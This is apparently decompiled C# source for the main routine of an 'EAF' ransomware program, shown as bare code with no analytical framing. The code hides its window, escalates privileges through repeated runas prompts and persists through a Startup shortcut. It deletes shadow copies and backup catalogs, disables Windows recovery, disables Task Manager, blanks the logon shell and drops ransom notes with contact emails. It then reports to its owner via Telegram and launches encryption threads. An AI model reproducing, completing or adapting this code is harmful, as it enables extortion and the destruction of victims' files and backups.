using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace Fast;

internal class Program
{
	public static string[] messages = new string[9] { "ATTENTION!", "At the moment, your system is not protected.", "We can fix it and restore files.", "To get started, send a file to decrypt trial.", "You can trust us after opening the test file.", "To restore the system write to this address: ", "", "Email 1: Decryption.helper@aol.com", "Email 2: Decryption.help@cyberfear.com" };

	public static string droppedMessageTextbox = "#FILES-ENCRYPTED.txt";

	public static string email1 = "Decryption.helper@aol.com";

	public static string email2 = "Decryption.help@cyberfear.com";

	public static string[] validExtensions = new string[1] { ".EAF" };

	public static string strProcessURL = Process.GetCurrentProcess().ProcessName;

	public static string strProcessName = Assembly.GetExecutingAssembly().GetName().Name;

	public static string processName = strProcessName + ".exe";

	public static string processURL = strProcessURL + ".url";

	public static string A = "1qw0ll8p9m8uezhqhyd";

	public static string B = "7z459ajrk722yn8c5j4fg";

	public static string C = "17CqMQFeuB3NTzJ";

	public static string D = "2X28tfRmWaPyPQgvoHV";

	public static string keyword = "QWERTYUIOPASDFGHJKLZXCVBNM";

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static void Main(string[] args)
	{
		IntPtr consoleWindow = GetConsoleWindow();
		ShowWindow(consoleWindow, 0);
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		copyResistForAdmin(processName);
		addLinkToStartup();
		runas_bat();
		addAndOpenNote();
		Reg();
		deleteBackupCatalog();
		disableRecoveryMode();
		deleteShadowCopies();
		spreadIt();
		Icon.SaveImage();
		Telegram.SendForOwner();
		ENC1.Start();
		ENC2.Start();
		ENC3.Start();
		ENC4.Start();
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void runCommand(string commands)
	{
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				Verb = "runas",
				FileName = "cmd.exe",
				Arguments = "/C " + commands,
				WindowStyle = ProcessWindowStyle.Hidden
			};
			process.Start();
			process.WaitForExit();
		}
		catch
		{
		}
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void Reg()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.String);
			RegistryKey registryKey2 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey2.SetValue("Shell", "empty", RegistryValueKind.String);
			RegistryKey registryKey3 = Registry.LocalMachine.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey3.SetValue("legalnoticecaption", "EAF", RegistryValueKind.String);
			registryKey3.SetValue("legalnoticetext", "You were attacked by the EAF team plz read #FILES-ENCRYPTED.txt", RegistryValueKind.String);
			RegistryKey registryKey4 = Registry.CurrentUser.CreateSubKey("Control Panel\\Desktop");
			registryKey4.SetValue("Wallpaper", "", RegistryValueKind.String);
		}
		catch
		{
		}
	}

	public static string UniqueID()
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"" + Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System))!.Remove(1, 2) + ":\"");
		val.Get();
		string text = ((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString();
		if (!string.IsNullOrEmpty(text))
		{
			return text;
		}
		ManagementObjectSearcher val2 = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
		string result = "";
		ManagementObjectEnumerator enumerator = val2.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val3 = (ManagementObject)enumerator.get_Current();
				result = ((ManagementBaseObject)val3).get_Item("SerialNumber").ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		return result;
	}

	public static string GetID()
	{
		object obj = "";
		NetworkInterface[] allNetworkInterfaces = NetworkInterface.GetAllNetworkInterfaces();
		int num = 0;
		if (num < allNetworkInterfaces.Length)
		{
			NetworkInterface networkInterface = allNetworkInterfaces[num];
			obj = networkInterface.GetPhysicalAddress().ToString();
		}
		if (string.IsNullOrEmpty(obj.ToString()))
		{
			obj = Environment.UserName;
		}
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(obj.ToString()));
	}

	private static void runas_bat()
	{
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				Verb = "runas",
				FileName = "cmd.exe",
				Arguments = "/C reagentc /disable",
				WindowStyle = ProcessWindowStyle.Hidden
			};
			process.Start();
			process.WaitForExit();
		}
		catch
		{
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	private static void spreadIt()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (!File.Exists(driveInfo.ToString() + droppedMessageTextbox))
			{
				try
				{
					File.WriteAllLines(driveInfo.ToString() + droppedMessageTextbox, messages);
				}
				catch
				{
				}
			}
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text3 = text2 + processName;
		ProcessStartInfo startInfo = new ProcessStartInfo(text3)
		{
			UseShellExecute = true,
			Verb = "runas",
			WindowStyle = ProcessWindowStyle.Normal,
			WorkingDirectory = text2
		};
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text3))
		{
			return;
		}
		if (!File.Exists(text3))
		{
			File.Copy(friendlyName, text3);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text3);
			Thread.Sleep(200);
			File.Copy(friendlyName, text3);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}
}
